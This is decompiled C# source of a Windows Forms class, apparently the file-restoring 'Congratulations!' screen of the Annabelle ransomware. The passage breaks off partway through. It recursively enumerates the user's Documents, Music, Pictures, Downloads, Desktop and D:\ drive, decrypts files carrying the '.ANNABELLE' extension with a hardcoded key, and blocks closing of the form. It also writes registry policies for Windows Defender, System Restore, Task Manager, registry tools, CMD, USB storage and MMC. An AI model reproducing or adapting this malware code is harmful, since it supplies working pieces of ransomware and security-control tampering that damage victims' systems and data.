using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.VisualBasic.MyServices;

[DesignerGenerated]
public class Form3 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer timer_0;

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar2")]
	internal virtual ProgressBar ProgressBar2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer_0
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_3;
			Timer val = timer_0;
			if (val != null)
			{
				Form3.smethod_13(val, eventHandler_);
			}
			timer_0 = value;
			val = timer_0;
			if (val != null)
			{
				Form3.smethod_14(val, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form3()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		Form3.smethod_0((Form)(object)this, new FormClosingEventHandler(method_0));
		Form3.smethod_1((Form)(object)this, (EventHandler)method_1);
		Form3.smethod_2((Form)(object)this, (EventHandler)method_2);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				Form3.smethod_3((IDisposable)icontainer_0);
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Expected O, but got Unknown
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		icontainer_0 = Form3.smethod_4();
		ComponentResourceManager componentResourceManager = Form3.smethod_6(Form3.smethod_5(typeof(Form3).TypeHandle));
		ProgressBar1 = Form3.smethod_7();
		ListBox1 = Form3.smethod_8();
		ProgressBar2 = Form3.smethod_7();
		Timer_0 = Form3.smethod_9(icontainer_0);
		Label1 = Form3.smethod_10();
		Form3.smethod_11((Control)(object)this);
		Form3.smethod_12((Control)(object)ProgressBar1, Color.Black);
		((Control)ProgressBar1).set_Location(new Point(227, 368));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(395, 35));
		((Control)ProgressBar1).set_TabIndex(5);
		ListBox1.set_BackColor(Color.Black);
		ListBox1.set_BorderStyle((BorderStyle)0);
		ListBox1.set_ForeColor(Color.Red);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(227, 115));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(395, 247));
		((Control)ListBox1).set_TabIndex(6);
		((Control)ProgressBar2).set_Location(new Point(227, 79));
		((Control)ProgressBar2).set_Name("ProgressBar2");
		((Control)ProgressBar2).set_Size(new Size(395, 30));
		((Control)ProgressBar2).set_TabIndex(7);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)Label1).set_Location(new Point(283, 25));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(272, 37));
		((Control)Label1).set_TabIndex(8);
		Label1.set_Text("Congratulations.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(626, 402));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form3");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Congratulations!");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void method_0(object sender, FormClosingEventArgs e)
	{
		Form3.smethod_15((CancelEventArgs)(object)e, bool_0: true);
	}

	private void method_1(object sender, EventArgs e)
	{
		Form3.smethod_16((Form)(object)Class1.Class2_0.Form2_0);
		Form3.smethod_17((Control)(object)Class1.Class2_0.Form2_0);
		Form3.smethod_19(Form3.smethod_18((Computer)(object)Class1.Class0_0));
	}

	private void method_2(object sender, EventArgs e)
	{
		Form3.smethod_20("C:\\Windows\\explorer.exe");
		Form3.smethod_21((Form)(object)this, (FormWindowState)0);
		Form3.smethod_22((Form)(object)this, bool_0: false);
		try
		{
			IEnumerator<string> enumerator = default(IEnumerator<string>);
			try
			{
				enumerator = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_25(Form3.smethod_24(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator2 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator))
				{
					string current = enumerator.Current;
					try
					{
						enumerator2 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator2))
						{
							string current2 = enumerator2.Current;
							if (!Form3.smethod_28(current2, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current2);
							}
						}
					}
					finally
					{
						if (enumerator2 != null)
						{
							Form3.smethod_3((IDisposable)enumerator2);
						}
					}
				}
			}
			finally
			{
				if (enumerator != null)
				{
					Form3.smethod_3((IDisposable)enumerator);
				}
			}
		}
		catch (Exception exception_)
		{
			Form3.smethod_32(exception_);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator3 = default(IEnumerator<string>);
			try
			{
				enumerator3 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_25(Form3.smethod_24(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form3.smethod_31((IEnumerator)enumerator3))
				{
					string current3 = enumerator3.Current;
					if (!Form3.smethod_28(current3, "desktop.ini"))
					{
						Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current3);
					}
				}
			}
			finally
			{
				if (enumerator3 != null)
				{
					Form3.smethod_3((IDisposable)enumerator3);
				}
			}
		}
		catch (Exception exception_2)
		{
			Form3.smethod_32(exception_2);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator4 = default(IEnumerator<string>);
			try
			{
				enumerator4 = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_34(Form3.smethod_24(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator5 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator4))
				{
					string current4 = enumerator4.Current;
					try
					{
						enumerator5 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current4).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator5))
						{
							string current5 = enumerator5.Current;
							if (!Form3.smethod_28(current5, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current5);
							}
						}
					}
					finally
					{
						if (enumerator5 != null)
						{
							Form3.smethod_3((IDisposable)enumerator5);
						}
					}
				}
			}
			finally
			{
				if (enumerator4 != null)
				{
					Form3.smethod_3((IDisposable)enumerator4);
				}
			}
		}
		catch (Exception exception_3)
		{
			Form3.smethod_32(exception_3);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator6 = default(IEnumerator<string>);
			try
			{
				enumerator6 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_34(Form3.smethod_24(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form3.smethod_31((IEnumerator)enumerator6))
				{
					string current6 = enumerator6.Current;
					if (!Form3.smethod_28(current6, "desktop.ini"))
					{
						Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current6);
					}
				}
			}
			finally
			{
				if (enumerator6 != null)
				{
					Form3.smethod_3((IDisposable)enumerator6);
				}
			}
		}
		catch (Exception exception_4)
		{
			Form3.smethod_32(exception_4);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator7 = default(IEnumerator<string>);
			try
			{
				enumerator7 = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_35(Form3.smethod_24(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0))), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator8 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator7))
				{
					string current7 = enumerator7.Current;
					try
					{
						enumerator8 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current7).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator8))
						{
							string current8 = enumerator8.Current;
							if (!Form3.smethod_28(current8, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current8);
							}
						}
					}
					finally
					{
						if (enumerator8 != null)
						{
							Form3.smethod_3((IDisposable)enumerator8);
						}
					}
				}
			}
			finally
			{
				if (enumerator7 != null)
				{
					Form3.smethod_3((IDisposable)enumerator7);
				}
			}
		}
		catch (Exception exception_5)
		{
			Form3.smethod_32(exception_5);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator9 = default(IEnumerator<string>);
			try
			{
				enumerator9 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_35(Form3.smethod_24(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0)))).GetEnumerator();
				while (Form3.smethod_31((IEnumerator)enumerator9))
				{
					string current9 = enumerator9.Current;
					if (!Form3.smethod_28(current9, "desktop.ini"))
					{
						Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current9);
					}
				}
			}
			finally
			{
				if (enumerator9 != null)
				{
					Form3.smethod_3((IDisposable)enumerator9);
				}
			}
		}
		catch (Exception exception_6)
		{
			Form3.smethod_32(exception_6);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator10 = default(IEnumerator<string>);
			try
			{
				enumerator10 = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_37("C:\\Users\\", Form3.smethod_36(), "\\Downloads"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator11 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator10))
				{
					string current10 = enumerator10.Current;
					try
					{
						enumerator11 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current10).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator11))
						{
							string current11 = enumerator11.Current;
							if (!Form3.smethod_28(current11, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current11);
							}
						}
					}
					finally
					{
						if (enumerator11 != null)
						{
							Form3.smethod_3((IDisposable)enumerator11);
						}
					}
				}
			}
			finally
			{
				if (enumerator10 != null)
				{
					Form3.smethod_3((IDisposable)enumerator10);
				}
			}
		}
		catch (Exception exception_7)
		{
			Form3.smethod_32(exception_7);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator12 = default(IEnumerator<string>);
			try
			{
				enumerator12 = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_37("C:\\Users\\", Form3.smethod_36(), "\\Downloads"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator13 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator12))
				{
					string current12 = enumerator12.Current;
					try
					{
						enumerator13 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current12).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator13))
						{
							string current13 = enumerator13.Current;
							if (!Form3.smethod_28(current13, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current13);
							}
						}
					}
					finally
					{
						if (enumerator13 != null)
						{
							Form3.smethod_3((IDisposable)enumerator13);
						}
					}
				}
			}
			finally
			{
				if (enumerator12 != null)
				{
					Form3.smethod_3((IDisposable)enumerator12);
				}
			}
		}
		catch (Exception exception_8)
		{
			Form3.smethod_32(exception_8);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator14 = default(IEnumerator<string>);
			try
			{
				enumerator14 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_37("C:\\Users\\", Form3.smethod_36(), "\\Downloads")).GetEnumerator();
				while (Form3.smethod_31((IEnumerator)enumerator14))
				{
					string current14 = enumerator14.Current;
					if (!Form3.smethod_28(current14, "desktop.ini"))
					{
						Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current14);
					}
				}
			}
			finally
			{
				if (enumerator14 != null)
				{
					Form3.smethod_3((IDisposable)enumerator14);
				}
			}
		}
		catch (Exception exception_9)
		{
			Form3.smethod_32(exception_9);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator15 = default(IEnumerator<string>);
			try
			{
				enumerator15 = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_37("C:\\Users\\", Form3.smethod_36(), "\\Desktop"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator16 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator15))
				{
					string current15 = enumerator15.Current;
					try
					{
						enumerator16 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current15).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator16))
						{
							string current16 = enumerator16.Current;
							if (!Form3.smethod_28(current16, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current16);
							}
						}
					}
					finally
					{
						if (enumerator16 != null)
						{
							Form3.smethod_3((IDisposable)enumerator16);
						}
					}
				}
			}
			finally
			{
				if (enumerator15 != null)
				{
					Form3.smethod_3((IDisposable)enumerator15);
				}
			}
		}
		catch (Exception exception_10)
		{
			Form3.smethod_32(exception_10);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator17 = default(IEnumerator<string>);
			try
			{
				enumerator17 = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_37("C:\\Users\\", Form3.smethod_36(), "\\Desktop"), (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator18 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator17))
				{
					string current17 = enumerator17.Current;
					try
					{
						enumerator18 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current17).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator18))
						{
							string current18 = enumerator18.Current;
							if (!Form3.smethod_28(current18, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current18);
							}
						}
					}
					finally
					{
						if (enumerator18 != null)
						{
							Form3.smethod_3((IDisposable)enumerator18);
						}
					}
				}
			}
			finally
			{
				if (enumerator17 != null)
				{
					Form3.smethod_3((IDisposable)enumerator17);
				}
			}
		}
		catch (Exception exception_11)
		{
			Form3.smethod_32(exception_11);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator19 = default(IEnumerator<string>);
			try
			{
				enumerator19 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), Form3.smethod_37("C:\\Users\\", Form3.smethod_36(), "\\Desktop")).GetEnumerator();
				while (Form3.smethod_31((IEnumerator)enumerator19))
				{
					string current19 = enumerator19.Current;
					if (!Form3.smethod_28(current19, "desktop.ini"))
					{
						Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current19);
					}
				}
			}
			finally
			{
				if (enumerator19 != null)
				{
					Form3.smethod_3((IDisposable)enumerator19);
				}
			}
		}
		catch (Exception exception_12)
		{
			Form3.smethod_32(exception_12);
			Form3.smethod_33();
		}
		try
		{
			IEnumerator<string> enumerator20 = default(IEnumerator<string>);
			try
			{
				enumerator20 = Form3.smethod_26(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), "D:\\", (SearchOption)2, new string[0]).GetEnumerator();
				IEnumerator<string> enumerator21 = default(IEnumerator<string>);
				while (Form3.smethod_31((IEnumerator)enumerator20))
				{
					string current20 = enumerator20.Current;
					try
					{
						enumerator21 = Form3.smethod_27(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), current20).GetEnumerator();
						while (Form3.smethod_31((IEnumerator)enumerator21))
						{
							string current21 = enumerator21.Current;
							if (!Form3.smethod_28(current21, "desktop.ini"))
							{
								Form3.smethod_30(Form3.smethod_29(ListBox1), (object)current21);
							}
						}
					}
					finally
					{
						if (enumerator21 != null)
						{
							Form3.smethod_3((IDisposable)enumerator21);
						}
					}
				}
			}
			finally
			{
				if (enumerator20 != null)
				{
					Form3.smethod_3((IDisposable)enumerator20);
				}
			}
		}
		catch (Exception exception_13)
		{
			Form3.smethod_32(exception_13);
			Form3.smethod_33();
		}
		Form3.smethod_38(Timer_0);
		object object_ = Form3.smethod_40(Form3.smethod_39("WScript.Shell", ""));
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\DisableRoutinelyTakingAction", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\DisableCMD", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\System\\DisableCMD", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\DisableCMD", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\DisableCMD", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\\DisableCMD", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\DisableCMD", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\\Restrict_Run", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form3.smethod_41(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\\Restrict_Run", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
	}

	private void method_3(object sender, EventArgs e)
	{
		Form3.smethod_42(ProgressBar2, 25);
		Form3.smethod_44(ProgressBar1, Form3.smethod_43(Form3.smethod_29(ListBox1)));
		if (Form3.smethod_45(ProgressBar1) == Form3.smethod_43(Form3.smethod_29(ListBox1)))
		{
			Form3.smethod_46(Timer_0);
			Form3.smethod_47();
			return;
		}
		Form3.smethod_48(ListBox1, Form3.smethod_45(ProgressBar1));
		Form3.smethod_49(ListBox1, (SelectionMode)1);
		string text = Form3.smethod_51(Form3.smethod_50(ListBox1));
		Form3.smethod_42(ProgressBar2, 50);
		try
		{
			byte[] byte_ = Class1.Class2_0.Form1_0.method_50("u8gPA4uY6w5CMCgw");
			byte[] byte_2 = Class1.Class2_0.Form1_0.method_51("u8gPA4uY6w5CMCgw");
			string string_ = Form3.smethod_52(text, ".ANNABELLE", "", 1, -1, (CompareMethod)0);
			Class1.Class2_0.Form1_0.method_52(text, string_, byte_, byte_2, Form1.GEnum0.ActionDecrypt);
			Form3.smethod_53(Form3.smethod_23((ServerComputer)(object)Class1.Class0_0), text);
		}
		catch (Exception exception_)
		{
			Form3.smethod_32(exception_);
			Form3.smethod_33();
		}
		Form3.smethod_42(ProgressBar2, 0);
		Form3.smethod_54(ProgressBar1, 1);
	}

	static void smethod_0(Form form_0, FormClosingEventHandler formClosingEventHandler_0)
	{
		form_0.add_FormClosing(formClosingEventHandler_0);
	}

	static void smethod_1(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_2(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_3(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_4()
	{
		return new Container();
	}

	static Type smethod_5(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static ComponentResourceManager smethod_6(Type type_0)
	{
		return new ComponentResourceManager(type_0);
	}

	static ProgressBar smethod_7()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ProgressBar();
	}

	static ListBox smethod_8()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ListBox();
	}

	static Timer smethod_9(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static Label smethod_10()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_11(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_12(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_13(Timer timer_1, EventHandler eventHandler_0)
	{
		timer_1.remove_Tick(eventHandler_0);
	}

	static void smethod_14(Timer timer_1, EventHandler eventHandler_0)
	{
		timer_1.add_Tick(eventHandler_0);
	}

	static void smethod_15(CancelEventArgs cancelEventArgs_0, bool bool_0)
	{
		cancelEventArgs_0.Cancel = bool_0;
	}

	static void smethod_16(Form form_0)
	{
		form_0.Close();
	}

	static void smethod_17(Control control_0)
	{
		control_0.Hide();
	}

	static Audio smethod_18(Computer computer_0)
	{
		return computer_0.get_Audio();
	}

	static void smethod_19(Audio audio_0)
	{
		audio_0.Stop();
	}

	static Process smethod_20(string string_0)
	{
		return Process.Start(string_0);
	}

	static void smethod_21(Form form_0, FormWindowState formWindowState_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_WindowState(formWindowState_0);
	}

	static void smethod_22(Form form_0, bool bool_0)
	{
		form_0.set_ShowInTaskbar(bool_0);
	}

	static FileSystemProxy smethod_23(ServerComputer serverComputer_0)
	{
		return serverComputer_0.get_FileSystem();
	}

	static SpecialDirectoriesProxy smethod_24(FileSystemProxy fileSystemProxy_0)
	{
		return fileSystemProxy_0.get_SpecialDirectories();
	}

	static string smethod_25(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyDocuments();
	}

	static ReadOnlyCollection<string> smethod_26(FileSystemProxy fileSystemProxy_0, string string_0, SearchOption searchOption_0, string[] string_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return fileSystemProxy_0.GetDirectories(string_0, searchOption_0, string_1);
	}

	static ReadOnlyCollection<string> smethod_27(FileSystemProxy fileSystemProxy_0, string string_0)
	{
		return fileSystemProxy_0.GetFiles(string_0);
	}

	static bool smethod_28(string string_0, string string_1)
	{
		return string_0.EndsWith(string_1);
	}

	static ObjectCollection smethod_29(ListBox listBox_0)
	{
		return listBox_0.get_Items();
	}

	static int smethod_30(ObjectCollection objectCollection_0, object object_0)
	{
		return objectCollection_0.Add(object_0);
	}

	static bool smethod_31(IEnumerator ienumerator_0)
	{
		return ienumerator_0.MoveNext();
	}

	static void smethod_32(Exception exception_0)
	{
		ProjectData.SetProjectError(exception_0);
	}

	static void smethod_33()
	{
		ProjectData.ClearProjectError();
	}

	static string smethod_34(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyMusic();
	}

	static string smethod_35(SpecialDirectoriesProxy specialDirectoriesProxy_0)
	{
		return specialDirectoriesProxy_0.get_MyPictures();
	}

	static string smethod_36()
	{
		return Environment.UserName;
